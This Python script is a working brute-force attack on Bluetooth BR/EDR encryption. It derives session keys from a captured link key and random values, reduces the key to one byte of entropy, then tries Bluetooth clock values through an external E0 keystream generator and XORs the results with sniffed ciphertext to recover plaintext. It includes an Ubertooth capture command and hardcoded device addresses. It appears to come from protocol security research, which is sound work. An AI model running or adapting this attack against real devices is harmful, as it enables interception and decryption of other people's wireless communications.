"""
bf.py

"""

from es import *
from e1 import *
from e3 import *
from cts import *

from constants import *
# log.setLevel(logging.DEBUG)
log.setLevel(logging.INFO)

from subprocess import Popen, PIPE
from sys import exit
from itertools import count, imap


def pattern_match(patterns, out):
    assert type(patterns) == dict
    assert type(out) == bytearray

    matches = {}
    for p in patterns.keys():
        matches[p] = []
        FOUND = out.find(patterns[p])
        while FOUND != -1:
            matches[p].append(FOUND)
            FOUND = out.find(patterns[p], FOUND+len(patterns[p]))

    return matches


def xor_bytes_till_shorter(l, r):
    """xor bytes until the shortest bytearray is consumed."""
    assert type(l) == bytearray
    assert type(r) == bytearray

    i = 0
    if len(l) <= len(r):
        out = bytearray(len(l))
        for b in l:
            out[i] = b ^ r[i]
            i += 1
        assert len(out) == len(l)
    else:
        out = bytearray(len(r))
        for b in r:
            out[i] = b ^ l[i]
            i += 1
        assert len(out) == len(r)
    log.debug('xor_bytes_till_shorter out: {}'.format(repr(out)))
    return out


def clk_targets(clk_uint):
    """BitArray from MSb at index 0 to LSb."""
    assert type(clk_uint) == int

    clk = BitArray()
    clk.append('uint:32={}'.format(clk_uint))
    # log.info('clk_targets clkb     : {}'.format(clk.bin))
    clk_26_1 = clk[-27:-1]
    while len(clk_26_1) < 32:
        clk_26_1.prepend('0b0')
    assert len(clk_26_1) == 32
    # log.info('clk_targets clk26_1   : {}'.format(clk_26_1.bin))
    # log.info('clk_targets clk26_1 le: {}'.format(clk_26_1.uintle))
    # log.info('clk_targets clk26_1 be: {}'.format(clk_26_1.uintbe))

    return clk_26_1


if __name__ == "__main__":
    log.warning('attack Assuming FEC and whitening already computed by Ubertooth')

    # NOTE: nexus5 master, check if endianess is correct
    BTADDR_M    = bytearray.fromhex('ccfa0070dcb6')
    LAP_M_HEX       = '70dcb6'
    LAP_M       = bytearray.fromhex('70dcb6')
    UAP_M_HEX       = '00'
    UAP_M       = bytearray.fromhex('00')
    log.info('attack BTADDR_M : {}'.format(repr(BTADDR_M)))
    UT_STRING = 'sudo ubertooth-rx -l {} -u {}  -r nexus.pcap'.format(LAP_M_HEX, UAP_M_HEX)
    log.info('attack start lmp and hci iblue monitors: {}'.format(UT_STRING))

    BTADDR_S    = bytearray.fromhex(MOTO_BTADD)
    log.info('attack BTADDR_S : {}'.format(repr(BTADDR_S)))

    # NOTE HCI: bthci_cmd.opcode == 0x040b
    Kl       = bytearray.fromhex('d5f20744c05d08601d28fa1dd79cdc27')
    log.info('attack Kl       : {}'.format(repr(Kl)))

    # NOTE LMP: btbrlmp.op == 11
    AU_RAND  = bytearray.fromhex('722e6ecd32ed43b7f3cdbdc2100ff6e0')
    log.info('attack AU_RAND  : {}'.format(bytearray_to_hexstring(AU_RAND)))
    SRES, ACO = e1(Kl, AU_RAND, BTADDR_S)
    R_SRES  = bytearray.fromhex('b0a3f41f')
    log.info('attack SRES     : {}'.format(repr(SRES)))
    log.info('attack R_SRES   : {}'.format(repr(R_SRES)))
    # NOTE LMP: btbrlmp.op == 12
    assert SRES == R_SRES
    log.info('attack ACO = COF: {}'.format(repr(ACO)))
    log.info('attack ACO = COF: {}'.format(bytearray_to_hexstring(ACO)))

    # NOTE LMP: btbrlmp.op == 17 master --> slave
    EN_RAND  = bytearray.fromhex('d72fb4217dcdc3145056ba488bea9076')
    log.info('attack EN_RAND  : {}'.format(bytearray_to_hexstring(EN_RAND)))

    # NOTE: COF = ACO
    Kc = e3(Kl, EN_RAND, ACO)
    log.info('attack Kc       : {}'.format(repr(Kc)))
    log.info('attack Kc       : {}'.format(bytearray_to_hexstring(Kc)))

    KC_PRIME_BYTES = 1
    Kc_prime = Kc_to_Kc_prime(Kc, KC_PRIME_BYTES)
    log.info('attack Kc_prime : {}, entropy: {} Byte'.format(repr(Kc_prime),
        KC_PRIME_BYTES))
    log.info('attack Kc_prime : {}, entropy: {} Byte'.format(
        bytearray_to_hexstring(Kc_prime), KC_PRIME_BYTES))

    #######################################################

    KS_BYTES  = 400
    KS_OFFSET = 0

    CTS_INDEX = 6
    CT = CTS[CTS_INDEX]
    CT_BYTES = len(CT)
    if CT_BYTES == 0:
        log.error('attack CTS_INDEX {} contains no CT'.format(CTS_INDEX))
        exit(1)
    elif CT_BYTES > KS_BYTES:
        log.error('attack len CT {} is greater than len ks'.format(CT_BYTES, KS_BYTES))
        exit(1)

    # CLK_ORDER = 'CLK'  # MSB..LSB
    CLK_ORDER = 'RCLK'   # LSB..MSB

    # NOTE: 2 ** 26 = 67108864
    # NOTE: 2 ** 32 = 4294967296
    # clkn + offset from ut capture
    TARGET_CLK    = clk_targets(314606).uintbe
    BEGIN = TARGET_CLK - 10000
    END   = TARGET_CLK + 10000
    # BEGIN = 148775
    # BEGIN = 178775
    BEGIN = 198775
    END   = BEGIN + 20000

    #######################################################

    _ = raw_input('Make sure to make e0 with correct Kc_prime, and BTADDR_M\n'
            'BEGIN: {}, END: {}, KS_BYTES: {}'.format(BEGIN, END, KS_BYTES))
    print('')

    filename = 'CT{}-{}-KS{}-{}-{}.bf'.format(CTS_INDEX, CLK_ORDER, KS_BYTES, BEGIN, END)
    with open(filename, mode="w") as fp:
        log.info('attack # BEGIN bruteforce : {}'.format(filename))
        fp.write('# BEGIN bruteforce: {}\n'.format(filename))
        log.info('attack {:10} {} CT  : {}'.format('',
            len(CT[:KS_BYTES]), bytearray_to_hexstring(CT[:KS_BYTES])))
        log.info('')
        log.info('PATTERNS: {}'.format(repr(PATTERNS)))
        fp.write('PATTERNS: {}\n'.format(repr(PATTERNS)))
        fp.write('CLK {:10} len: {} CT  : {}\n'.format('',
            len(CT[:KS_BYTES]), bytearray_to_hexstring(CT[:KS_BYTES])))
        fp.write('\n')

        for i in count(BEGIN):  # BEGIN..END
            if i % 50000 == 0:
                log.info('attack i: {:10}, BEGIN: {}, END: {}'.format(i, BEGIN, END))
            CLK_HEX = hex(i)[2:]
            if len(CLK_HEX) % 2 == 1:
                CLK_HEX = '0' + CLK_HEX
            # log.info('attack {:10} CLK_HEX: {}'.format(i, CLK_HEX))
            CLK = bytearray.fromhex(CLK_HEX)
            # NOTE: bytearray grows from right to left
            while len(CLK) < 4:
                CLK = '\x00' + CLK
            assert(len(CLK) == 4)
            # log.info('attack {:10} CLK_HEX: {}, CLK: {}'.format(i, CLK_HEX, repr(CLK)))
            fp.write('CLK: {:10}, CLK_HEX: {}, CLK: {}\n'.format(i, CLK_HEX, repr(CLK)))

            # NOTE: C init API
            # int KS_BYTES  = atoi(argv[1])
            # int KS_OFFSET = atoi(argv[2])
            # uint8_t a     = atoi(argv[3])
            # uint8_t b     = atoi(argv[4])
            # uint8_t c     = atoi(argv[5])
            # uint8_t d     = atoi(argv[6])
            if CLK_ORDER == 'CLK':
                ARGS = [ E0_IMPL_PATH, str(KS_BYTES), str(KS_OFFSET),
                    str(CLK[0]),  # CLK[0] is MSB
                    str(CLK[1]),
                    str(CLK[2]),
                    str(CLK[3]),
                ]
            elif CLK_ORDER == 'RCLK':
                ARGS = [ E0_IMPL_PATH, str(KS_BYTES), str(KS_OFFSET),
                    str(CLK[3]),  # CLK[3] is LSB
                    str(CLK[2]),
                    str(CLK[1]),
                    str(CLK[0]),
                ]
            else:
                log.error('attack unknown clock order: {}'.format(CLK_ORDER))
                exit(1)

            p = Popen(ARGS, stdout=PIPE)
            ks = bytearray.fromhex(p.stdout.readline())
            assert(len(ks) == KS_BYTES)

            # log.info('attack {:10} {} ks  : {}'.format(i, len(ks), bytearray_to_hexstring(ks)))
            fp.write('CLK: {:10} len: {} ks  : {}\n'.format(i, len(ks), bytearray_to_hexstring(ks)))

            for offset in range(KS_BYTES - CT_BYTES):

                out = xor_bytes_till_shorter(CT, ks[offset:])
                # log.info('attack {:10} {} out : {}'.format(i, len(out), bytearray_to_hexstring(out)))
                fp.write('CLK: {:10} off: {} len: {} out : {}\n'.format(i, offset, len(out),
                    bytearray_to_hexstring(out)))

                # NOTE: PATTERNS are in constants.py
                matches = pattern_match(PATTERNS, out)
                for match in matches.keys():
                    if len(matches[match]) > 0:
                        log.info('attack i: {:10}, off: {}, CLK_HEX: {}, MATCH {} {} at {}'.format(i,
                            offset, CLK_HEX, match, repr(PATTERNS[match]), matches[match]))
                        fp.write('CLK: {:10} off: {}, CLK_HEX: {}, MATCH {} {} at {}\n'.format(i,
                            offset, CLK_HEX, match, repr(PATTERNS[match]), matches[match]))

            fp.write('\n')

            if i == END:
                log.info('attack # END   bruteforce: {}'.format(filename))
                fp.write('# END   bruteforce: {}\n'.format(filename))
                break


